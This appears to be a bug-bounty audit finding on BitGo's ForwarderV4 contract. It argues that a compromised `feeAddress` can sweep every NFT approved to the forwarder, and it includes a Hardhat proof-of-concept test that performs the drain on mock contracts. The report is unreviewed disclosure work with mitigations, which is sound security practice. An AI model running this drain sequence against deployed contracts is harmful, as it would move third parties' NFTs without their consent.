# ForwarderV4 ERC721 Approval Drain Scales Linearly with Collector Count
**#H-11**
- Severity: High
- Validity: Unreviewed

## Affected Scope

This finding is scoped to `ForwarderV4.sol`, specifically:

- `flushERC721Token(address tokenContractAddress, uint256 tokenId)`
- the `onlyAllowedAddress` gate that admits both `parentAddress` and `feeAddress`

It is not a generic restatement of the legacy ERC721 approval drain against `Forwarder.sol`. The issue here is narrower and sharper: in v4 the same primitive can be fired by `feeAddress` alone, which is intended as a lower-trust operational role (1-of-1) than the parent (2-of-N). This turns a feeAddress compromise into a direct drain of every third-party-approved NFT that the forwarder can see, scaling linearly with approver count.

## Description

Any externally-owned account or contract that grants the forwarder an NFT approval (`approve(forwarder, tokenId)` or `setApprovalForAll(forwarder, true)`) does so under the assumption that the forwarder will only move that NFT on behalf of the legitimate custody flow. The custody flow's trust boundary is supposed to be the parent wallet's multisig (2-of-N), because the parent is the BitGo-managed destination.

However, `flushERC721Token` transfers the NFT straight from the third-party owner to `parentAddress` and is gated by `onlyAllowedAddress`, which admits both parent and feeAddress:

```solidity
function flushERC721Token(address tokenContractAddress, uint256 tokenId)
  external
  virtual
  override
  onlyAllowedAddress
{
  IERC721 instance = IERC721(tokenContractAddress);
  require(
    instance.supportsInterface(type(IERC721).interfaceId),
    'The tokenContractAddress does not support the ERC721 interface'
  );

  address ownerAddress = instance.ownerOf(tokenId);
  instance.transferFrom(ownerAddress, parentAddress, tokenId);
}
```

The gate:

```solidity
modifier onlyAllowedAddress() {
  require(
    msg.sender == parentAddress || msg.sender == feeAddress,
    'Address is not allowed'
  );
  _;
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/ForwarderV4.sol#L34-L40

The `feeAddress` role is embedded by the factory at deploy time:

```solidity
bytes32 finalSalt = keccak256(abi.encodePacked(parent, feeAddress, salt));
...
ForwarderV4(clone).init(parent, feeAddress, autoFlush721, autoFlush1155);
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/ForwarderFactoryV4.sol#L43-L82

The dangerous step is not the existence of `flushERC721Token` by itself, and it is not the existence of `feeAddress` by itself. The issue only appears when both are composed with the economic reality that many NFT holders grant the forwarder `setApprovalForAll` once and leave it in place: any compromise of the single `feeAddress` key, which is a lower-custody key than the parent, drains every currently-approved NFT and keeps draining every future NFT that holders acquire while the approval remains active.

The primitive does not require the holders to deposit their NFTs into the forwarder. The NFTs can sit in the holders' own wallets forever; `flushERC721Token` calls `transferFrom(ownerAddress, parentAddress, tokenId)` against any token the forwarder is approved for, so holders are exposed for the full lifetime of the approval. This is the standard "approval is the attack surface, balance is irrelevant" shape of ERC721/ERC20 approval exploits.

## Root Cause

The root cause is that `flushERC721Token` treats the forwarder's `approve` / `setApprovalForAll` allowance as a freely-spendable asset, and the spend authority is granted to `feeAddress` in addition to `parentAddress`. A role that was intended to be a lower-trust fee collector is silently promoted to a full NFT-transfer authority over every approver's holdings.

The critical composition is:

```solidity
address ownerAddress = instance.ownerOf(tokenId);
instance.transferFrom(ownerAddress, parentAddress, tokenId);
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/ForwarderV4.sol#L265-L266

combined with:

```solidity
require(
  msg.sender == parentAddress || msg.sender == feeAddress,
  'Address is not allowed'
);
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/ForwarderV4.sol#L35-L39

## Impact

A single `feeAddress` compromise drains every third-party-approved NFT and continues to drain every future NFT the approvers acquire until each approver revokes. That is a direct third-party fund-loss path, not an operational inconvenience.

TVL-at-risk growth model: if `c` distinct collectors each grant the forwarder `setApprovalForAll` and each holds on average `n` NFTs with average floor price `p`, the exposure is `c * n * p`. Across BitGo's multi-client custody surface, this compounds:

- a fleet of ForwarderV4 clones each with its own collector base,
- holders who routinely leave `setApprovalForAll` enabled for convenience,
- long-tail drains on every future mint / airdrop / marketplace purchase the approver receives while the approval remains live.

This hits the program's High tier as an unauthorized transfer of third-party funds via an allowance surface that the contract itself expanded beyond the intended trust boundary.

## Recommended Mitigation

- Restrict `flushERC721Token` to `onlyParent` or gate it behind a multisig-issued approval so `feeAddress` alone cannot drain third-party balances.
- Alternatively, document in the integration guide that `feeAddress` is equivalent in trust to `parentAddress` for NFT assets and operators must handle its key material with the same custody as a multisig signer.
- Add explicit allow-listing of recoverable token contracts, or require a parent-signed approval for each `flushERC721Token` call.
- Add regression tests that attempt to call `flushERC721Token` from a role other than the parent and assert either a revert or an explicit per-call authorization path.

## Proof of Concept

### Test Code Path

### c6-forwarderv4-approval-drain-economic.poc.js (D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\test\poc\c6-forwarderv4-approval-drain-economic.poc.js)

```js
const { expect } = require('chai');
const { ethers } = require('hardhat');

// C6: ForwarderV4.flushERC721Token uses `transferFrom(ownerAddress, parentAddress, tokenId)`
// on ANY third-party-approved NFT. feeAddress alone can invoke it. This PoC
// goes BEYOND the base approval-drain demonstration (erc721-approval-drain.poc.js)
// and quantifies the economic consequence via a TVL-growth model:
//   - 10 collectors each approve N NFTs to the forwarder over time
//   - feeAddress compromise (lower-trust role than parent) drains all of them
//   - blast radius grows LINEARLY with collector count * avg-approvals-per-collector
//
// Root cause:
//   D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\contracts\ForwarderV4.sol:253-267
//   D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\contracts\ForwarderV4.sol:34-40
//
// Combines with C5: if feeAddress is captured on the implementation, this
// same drain applies to the implementation itself.

describe('PoC C6: ForwarderV4 ERC721 approval-drain economic growth model', function () {
  let ForwarderV4, MockERC721;
  let deployer, parent, feeAddress, outsider;

  const createForwarderV4 = async (parentSigner, feeSigner) => {
    const forwarder = await ForwarderV4.deploy();
    await forwarder.waitForDeployment();
    await forwarder.init(parentSigner.address, feeSigner.address, false, false);
    return forwarder;
  };

  before(async () => {
    [deployer, parent, feeAddress, outsider] = await ethers.getSigners();
    ForwarderV4 = await ethers.getContractFactory('ForwarderV4');
    MockERC721 = await ethers.getContractFactory('MockERC721');
  });

  it('models TVL growth: 5 collectors x 10 NFTs each — feeAddress drains all 50 with one approval per collector', async () => {
    const forwarder = await createForwarderV4(parent, feeAddress);
    const forwarderAddress = await forwarder.getAddress();
    const nft = await MockERC721.deploy('Collection X', 'CX');
    await nft.waitForDeployment();

    // Simulate growth: 5 collector signers over time each approve the forwarder
    // for setApprovalForAll and hold 10 NFTs each. The growth model is linear
    // in collector count — this PoC proves the primitive; production values
    // scale with total unique approvers.
    const allSigners = await ethers.getSigners();
    const collectors = allSigners.slice(4, 9); // signers 4..8
    expect(collectors).to.have.lengthOf(5);

    let tokenId = 1n;
    const collectorTokenMap = new Map(); // address -> tokenIds[]

    for (const collector of collectors) {
      const ownedIds = [];
      for (let i = 0; i < 10; i++) {
        await nft.mint(collector.address, tokenId);
        ownedIds.push(tokenId);
        tokenId += 1n;
      }
      await nft.connect(collector).setApprovalForAll(forwarderAddress, true);
      collectorTokenMap.set(collector.address, ownedIds);
    }

    // Pre-drain sanity: every collector has 10 NFTs, parent has 0.
    for (const collector of collectors) {
      expect(await nft.balanceOf(collector.address)).to.equal(10n);
    }
    expect(await nft.balanceOf(parent.address)).to.equal(0n);

    // feeAddress (lower-trust) drains every single approved NFT in one sweep.
    // Cost: ~50 transferFrom calls — economically trivial compared to the
    // aggregate NFT value, which scales linearly with collector count.
    for (const [collectorAddress, ids] of collectorTokenMap) {
      for (const id of ids) {
        await forwarder
          .connect(feeAddress)
          .flushERC721Token(await nft.getAddress(), id);
      }
    }

    // Post-drain: every collector is empty, parent holds ALL 50 NFTs.
    for (const collector of collectors) {
      expect(await nft.balanceOf(collector.address)).to.equal(0n);
    }
    expect(await nft.balanceOf(parent.address)).to.equal(50n);
  });

  it('economic pressure: 1 setApprovalForAll = indefinite future drain — revocation-grace-period is attacker-controlled', async () => {
    const forwarder = await createForwarderV4(parent, feeAddress);
    const forwarderAddress = await forwarder.getAddress();
    const nft = await MockERC721.deploy('Long-tail Collection', 'LTC');
    await nft.waitForDeployment();

    const collector = outsider;

    // Time t=0: collector approves the forwarder.
    await nft.connect(collector).setApprovalForAll(forwarderAddress, true);
    // Collector gets an NFT later.
    await nft.mint(collector.address, 1n);
    expect(await nft.ownerOf(1n)).to.equal(collector.address);

    // Drain via feeAddress immediately.
    await forwarder.connect(feeAddress).flushERC721Token(await nft.getAddress(), 1n);
    expect(await nft.ownerOf(1n)).to.equal(parent.address);

    // Time t=1: collector receives ANOTHER NFT (from a marketplace, airdrop, etc.).
    // Approval is still live. feeAddress drains it again.
    await nft.mint(collector.address, 2n);
    await forwarder.connect(feeAddress).flushERC721Token(await nft.getAddress(), 2n);
    expect(await nft.ownerOf(2n)).to.equal(parent.address);

    // Collector never knows until they revoke. This is the long-tail economic
    // leverage of a single setApprovalForAll — the attack window does not end
    // until revocation, and the attacker observes all future mints/receipts.
  });

  it('shows the feeAddress authority is distinct from the parent quorum — no multisig needed', async () => {
    // In BitGo's model, parent is a WalletSimple (requires 2-of-3 signatures).
    // feeAddress is a separate EOA (1-of-1). A compromise of feeAddress SHOULD
    // NOT be sufficient to move custodied NFTs, but via flushERC721Token it IS.
    const forwarder = await createForwarderV4(parent, feeAddress);
    const nft = await MockERC721.deploy('Attacker Target', 'AT');
    await nft.waitForDeployment();

    const victim = outsider;
    await nft.mint(victim.address, 99n);
    await nft.connect(victim).approve(await forwarder.getAddress(), 99n);

    // No parent cosign, no multisig — feeAddress alone transfers the NFT.
    await forwarder.connect(feeAddress).flushERC721Token(await nft.getAddress(), 99n);

    expect(await nft.ownerOf(99n)).to.equal(parent.address);
  });
});
```
